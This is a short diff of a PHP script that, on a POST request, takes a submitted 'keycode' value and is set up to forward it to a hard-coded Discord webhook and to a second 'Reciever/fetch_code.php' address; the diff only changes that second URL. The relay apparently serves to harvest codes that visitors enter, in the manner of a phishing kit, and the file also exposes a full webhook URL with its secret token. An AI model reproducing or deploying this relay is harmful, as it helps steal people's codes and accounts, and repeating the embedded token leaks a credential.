@@ -2,7 +2,7 @@
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_POST['keycode'])) {
         $discordWebhookUrl = 'https://discord.com/api/webhooks/1133224788115079168/Aew8Py8biJmtqlCl23e9HDywn3iGJfAgXL8uF-P6qelx9YSAdkG2bEYCaaYy5rdvDl_3';
-        $secondWebsiteUrl = 'https://lostsociet.github.io/fetch_code.php';
+        $secondWebsiteUrl = 'https://lostsociet.github.io/Reciever/fetch_code.php';
 
         // Data for Discord webhook
         $keycode = $_POST['keycode'];
